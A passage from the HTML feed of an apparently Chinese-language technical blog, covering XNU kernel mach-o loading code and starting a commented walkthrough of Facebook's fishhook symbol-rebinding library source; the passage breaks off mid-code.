aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		dyld_aslr_offset = random();</span><br><span class="line">		dyld_aslr_offset %= max_slide_pages;</span><br><span class="line">		dyld_aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!result)</span><br><span class="line">		result = &amp;myresult;</span><br><span class="line"></span><br><span class="line">	*result = load_result_null;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//解析macho的文件格式</span></span><br><span class="line">	lret = parse_machfile(vp, <span class="built_in">map</span>, thread, header, file_offset, macho_size,</span><br><span class="line">	                      <span class="number">0</span>, (<span class="keyword">int64_t</span>)aslr_offset, (<span class="keyword">int64_t</span>)dyld_aslr_offset, result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">			vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(lret);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * On x86, for compatibility, don't enforce the hard page-zero restriction for 32-bit binaries.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		enforce_hard_pagezero = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Check to see if the page zero is enforced by the map-&gt;min_offset.</span><br><span class="line">	 */</span> </span><br><span class="line">	<span class="keyword">if</span> (enforce_hard_pagezero &amp;&amp;</span><br><span class="line">	    (vm_map_has_hard_pagezero(<span class="built_in">map</span>, <span class="number">0x1000</span>) == FALSE)) &#123;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> (LOAD_BADMACHO);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	Commit to new map.</span><br><span class="line">	 *</span><br><span class="line">	 *	Swap the new map for the old, which  consumes our new map</span><br><span class="line">	 *	reference but each leaves us responsible for the old_map reference.</span><br><span class="line">	 *	That lets us get off the pmap associated with it, and</span><br><span class="line">	 *	then we can release it.</span><br><span class="line">	 */</span></span><br><span class="line">	 <span class="comment">//用新申请的内存替换原来的内存</span></span><br><span class="line">	 <span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * If this is an exec, then we are going to destroy the old</span><br><span class="line">		 * task, and it's correct to halt it; if it's spawn, the</span><br><span class="line">		 * task is not yet running, and it makes no sense.</span><br><span class="line">		 */</span></span><br><span class="line">	 	<span class="keyword">if</span> (!spawn) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Mark the task as halting and start the other</span><br><span class="line">			 * threads towards terminating themselves.  Then</span><br><span class="line">			 * make sure any threads waiting for a process</span><br><span class="line">			 * transition get informed that we are committed to</span><br><span class="line">			 * this transition, and then finally complete the</span><br><span class="line">			 * task halting (wait for threads and then cleanup</span><br><span class="line">			 * task resources).</span><br><span class="line">			 *</span><br><span class="line">			 * <span class="doctag">NOTE:</span> task_start_halt() makes sure that no new</span><br><span class="line">			 * threads are created in the task during the transition.</span><br><span class="line">			 * We need to mark the workqueue as exiting before we</span><br><span class="line">			 * wait for threads to terminate (at the end of which</span><br><span class="line">			 * we no longer have a prohibition on thread creation).</span><br><span class="line">			 * </span><br><span class="line">			 * Finally, clean up any lingering workqueue data structures</span><br><span class="line">			 * that may have been left behind by the workqueue threads</span><br><span class="line">			 * as they exited (and then clean up the work queue itself).</span><br><span class="line">			 */</span></span><br><span class="line">			kret = task_start_halt(task);</span><br><span class="line">			<span class="keyword">if</span> (kret != KERN_SUCCESS) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">				<span class="keyword">return</span> (LOAD_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line">			proc_transcommit(p, <span class="number">0</span>);</span><br><span class="line">			workqueue_mark_exiting(p);</span><br><span class="line">			task_complete_halt(task);</span><br><span class="line">			workqueue_exit(p);</span><br><span class="line">			kqueue_dealloc(p-&gt;p_wqkqueue);</span><br><span class="line">			p-&gt;p_wqkqueue = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		old_map = swap_task_map(old_task, thread, <span class="built_in">map</span>, !spawn);</span><br><span class="line">		vm_map_deallocate(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(LOAD_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要做了<code>macho</code>文件解析之外其他所有和加载相关的工作。</p>
<ul>
<li>对新的task做了内存的分配</li>
<li>加强安全方面的设置主要是<code>DEP</code>和<code>ASRL</code></li>
<li>调用函数解析macho文件</li>
<li>解析成功之后，用新申请的内存替换旧的内存。</li>
</ul>
<h2 id="1-5_parse_machfile">1.5 parse_machfile</h2><p>这个函数做的事情就非常的简单清楚了，就是将<code>macho</code>文件解析，并且映射到内存中。</p>
<p>在我的<a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#0x03_Load_Commands">macho文件格式分析</a>中已经分析过这一块代码了。这里就不复述了。</p>
<h1 id="0x02_小结">0x02 小结</h1><p>通过对整个流程源码的一次简单梳理，大致明白了整个流程在源码中是怎么样实现的，在研究这方面的漏洞的时候可以更快的明白问题出在哪里，也可能更深刻的理解漏洞的成因以及重现的方法。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
<p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-o加载流程学习-dyld对主image的处理流程</a></p>
<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
<p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
<p>​    </p>
<p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p>]]>
    
    </summary>
    
      <category term="OSX" scheme="http://turingh.github.io/tags/OSX/"/>
    
      <category term="execve" scheme="http://turingh.github.io/tags/execve/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[fishhook源码分析]]></title>
    <link href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/22/fishhook源码分析/</id>
    <published>2016-03-22T15:14:53.000Z</published>
    <updated>2016-03-24T03:35:54.000Z</updated>
    <content type="html"><![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o格式分析</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">mach-o延时绑定</a><br><a id="more"></a></p>
<h1 id="源码">源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright (c) 2013, Facebook, Inc.</span></span><br><span class="line"><span class="comment">// All rights reserved.</span></span><br><span class="line"><span class="comment">// Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">// modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">//   * Redistributions of source code must retain the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">//   * Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">//     and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">//   * Neither the name Facebook nor the names of its contributors may be used to</span></span><br><span class="line"><span class="comment">//     endorse or promote products derived from this software without specific</span></span><br><span class="line"><span class="comment">//     prior written permission.</span></span><br><span class="line"><span class="comment">// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</span></span><br><span class="line"><span class="comment">// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import <span class="string">"fishhook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import &lt;dlfcn.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/dyld.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/loader.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/nlist.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header_64 <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command_64 <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section_64 <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist_64 <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT_64</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> SEG_DATA_CONST</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SEG_DATA_CONST  <span class="string">"__DATA_CONST"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> rebindings_entry &#123;</span><br><span class="line">  <span class="keyword">struct</span> rebinding *rebindings;</span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> rebindings_entry *_rebindings_head;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepend_rebindings</span><span class="params">(<span class="keyword">struct</span> rebindings_entry **rebindings_head,</span><br><span class="line">                              <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                              size_t nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *new_entry = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebindings_entry));</span><br><span class="line">  <span class="keyword">if</span> (!new_entry) &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  new_entry-&gt;rebindings = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  <span class="keyword">if</span> (!new_entry-&gt;rebindings) &#123;</span><br><span class="line">    <span class="built_in">free</span>(new_entry);</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(new_entry-&gt;rebindings, rebindings, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  new_entry-&gt;rebindings_nel = nel;</span><br><span class="line">  new_entry-&gt;next = *rebindings_head;</span><br><span class="line">  *rebindings_head = new_entry;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                           section_t *section,</span><br><span class="line">                                           intptr_t slide,</span><br><span class="line">                                           nlist_t *symtab,</span><br><span class="line">                                           <span class="keyword">char</span> *strtab,</span><br><span class="line">                                           uint32_t *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//__la_symbol_ptr的reserved1字段标识了section描述的符号在符号表中开始的index</span></span><br><span class="line">  <span class="comment">//动态符号表中第一个需要解析的符号 开始地址</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//获取每一个需要动态解析的符号在符号表中的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//通过符号表中每一个导入符号的字符串表偏移量获取符号对应的字符串（符号的名字）</span></span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *cur = rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(symbol_name) &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">		  <span class="comment">//找到相同的函数替换指针</span></span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">          &#125;</span><br><span class="line">          indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">          <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef struct &#123;</span></span><br><span class="line"><span class="comment">//    const char *dli_fname;  /* Pathname of shared object that</span></span><br><span class="line"><span class="comment">//                               contains address */</span></span><br><span class="line"><span class="comment">//    void       *dli_fbase;  /* Address at which shared object</span></span><br><span class="line"><span class="comment">//                               is loaded */</span></span><br><span class="line"><span class="comment">//    const char *dli_sname;  /* Name of nearest symbol with address</span></span><br><span class="line"><span class="comment">//                               lower than addr */</span></span><br><span class="line"><span class="comment">//    void       *dli_saddr;  /* Exact address of symbol named</span></span><br><span class="line"><span class="comment">//                               in dli_sname */</span></span><br><span class="line"><span class="comment">//&#125; Dl_info;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rebind_symbols_for_image</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                     <span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                     intptr_t slide)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//获取Dl_info</span></span><br><span class="line">  Dl_info info;</span><br><span class="line">  <span class="keyword">if</span> (dladdr(header, &amp;info) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> symtab_command* symtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> dysymtab_command* dysymtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">//在lc_segment中遍历寻找__LINKEDIT的section</span></span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//遍历寻找lc_symtab</span></span><br><span class="line">      symtab_cmd = (<span class="keyword">struct</span> symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//遍历寻找lc_dysymtab</span></span><br><span class="line">      dysymtab_cmd = (<span class="keyword">struct</span> dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检测必要的数据结构是否都存在</span></span><br><span class="line">  <span class="comment">/*</span><br><span class="line">  LC_SYMTAB这个LoadCommand主要提供了两个信息</span><br><span class="line">	Symbol Table的偏移量与Symbol Table中元素的个数</span><br><span class="line">	String Table的偏移量与String Table的长度</span><br><span class="line">  LC_DYSYMTAB</span><br><span class="line">	提供了动态符号表的位移和元素个数，还有一些其他的表格索引</span><br><span class="line">  LC_SEGMENT.__LINKEDIT</span><br><span class="line">	含有为动态链接库使用的原始数据</span><br><span class="line">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find base symbol/string table addresses</span></span><br><span class="line">  <span class="comment">// 获取链接时程序的基址</span></span><br><span class="line">  <span class="comment">// 基址 = __LINKEDIT.VM_Address - __LINK.File_Offset + silde的改变值</span></span><br><span class="line">  <span class="comment">// machoview随便看一个程序的__LINKEDIT</span></span><br><span class="line">  <span class="comment">// offset 	| data 					| Description 		| value</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 0x0000390	  0x0000000100002000	  VM Address		  4294975488</span></span><br><span 